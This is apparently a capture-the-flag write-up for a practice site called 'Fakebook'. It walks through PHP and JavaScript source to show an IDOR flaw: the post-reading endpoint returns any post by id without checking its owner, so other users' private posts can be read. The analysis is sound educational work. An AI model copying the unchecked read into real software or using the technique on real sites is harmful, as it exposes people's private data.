    - I know, I know, you might think "Come on, this's just IDOR, no need to analyze the source code, turn on the burpsuite and start changing the ID please"

      [!] Hold on my friend, mindset is everything, burpsuite makes things done. but whitebox makes things clear

    - In the index.php, you can see there are Login and Register forms. Oh hoo! what's going on here "Fakebook helps you connect and stalk your crush" (~.~!)

    - Let's say that you created an account and do the normal activities of a normal user

        => After logging in, you create a random post and click on "Submit", a message in JSON format appeared said that "Post Created", 
           then you were redirected back to the wall.php with your post shown there

    - Things started with index.php right, we gonna see that first

    - Nothing special! Let's see what's going on in the post.php

        [+] post.php
            ....
            switch ($_GET['action']) {
                case 'list_posts':
                    $res = select_all( // [?] Remind: fetchAll() function in the db.php
                        'SELECT post_id, public FROM posts WHERE author_id = ?',
                        $user_id
                    );
                    echo json_encode($res);
                    break;
                case 'read':
                    $post = select_one(
                        'SELECT content, public, author_id FROM posts WHERE post_id = ?',
                        $_GET['id'] // [?] This one might be the IDOR we are looking for since there is no filter to protect it from the attacker
                    );    
                    if ($post)
                        echo json_encode($post);
                    else
                        echo json_encode("Not Found");
                    break;
                case 'create':
                    $res = exec_query(
                        'INSERT INTO posts (content, public, author_id) VALUES (?, ?, ?);', $_POST['content'], $_POST['public'], $user_id);
                    header('Refresh:2; url=wall.php'); // Redirect back to the wall.php after 2s

            }

    - Cool, we found something helpful, but still, we don't know where to find the "read" action, let's keep moving

    - When I was going to analyse the wall.php, I realized that this is just like an html file, but I found app.js which is related to this and has an important role

        [+] wall.php
            ...
                <div class="row">
                    <div class="col-sm-12 mt-5 text-center">
                        <h2>Posts</h2>
                    </div>
                    <div class="col-sm-12 text-center">
                        <div id="wall"></div>
                    </div>
                </div>

            </div>
            <script src="/static/js/app.js"></script>
            ...

        [+] app.js 

            async function list_posts() { // [?] Keywords for someone who doesn't know _ "Async and await" + "Promise" + "Callback Hell"
                var url = "/post.php?action=list_posts"; 
                var response = await fetch(url); // [?] sends a request to "/post.php?action=list_posts" using the fetch function.
                return await response.json()
            }

            async function read_post(post_id) { // [?] This is an anonymous function that takes the posts parameter
                var url = `/post.php?action=read&id=${post_id}`;
                var response = await fetch(url); // [?] Hehe, he's here (^.^`) 
                return await response.json()
            }

            function main() {
                list_posts().then(function (posts) {
                    var wall = document.getElementById("wall"); // Gets a reference to an HTML element with the id "wall" <=> <div id="wall"></div>
                    posts.forEach(async function (post) {
                        var p = document.createElement("p"); // For each post in the result, it creates a paragraph element (<p>)
                        if (post.public == "1") {
                            await read_post(post.post_id).then(function (post_data) {
                                p.innerText = "🌐 " + post_data["content"];
                            })
                        } else {
                            await read_post(post.post_id).then(function (post_data) {
                            p.innerText = "🔒 " + post_data["content"];
                            })
                        }
                        wall.appendChild(p); // [?] This's why you see all the posts you wrote
                    })
                });
            }
            main();

    - Of course, you might not understand it immediately, but this is the logic to exploit the IDOR vulnerability in this case

        [1] First stuff, when you create a post (in public mode or private, whatever) you will see the "Post Created" and then you will be redirected back to wall.php after 2s
                ...
                case 'create':
                    $res = exec_query(
                        'INSERT INTO posts (content, public, author_id) VALUES (?, ?, ?);', $_POST['content'], $_POST['public'], $user_id);
                    header('Refresh:2; url=wall.php');
                    echo json_encode('Post created');
                    break;

        [2] And, then in wall.php you have app.js which contains

            async function read_post(post_id) { 
                var url = `/post.php?action=read&id=${post_id}`;
                var response = await fetch(url);
                return await response.json()
            }

            => This code will sent in a request in the format like /post.php?action=read&id=[you can change this to whatever you want in this case it is the id of other's post]

        [3] After that, your post will be printed out by the "list_posts().then(function (posts) {...})", and combined with this in the post.php
                ...
                case 'read':
                    $post = select_one(
                        'SELECT content, public, author_id FROM posts WHERE post_id = ?',$_GET['id'] );    
                    if ($post)
                        echo json_encode($post);
                    else
                        echo json_encode("Not Found");
                    break;
            
            => Now, you can print out the posts of others (admin or crush)
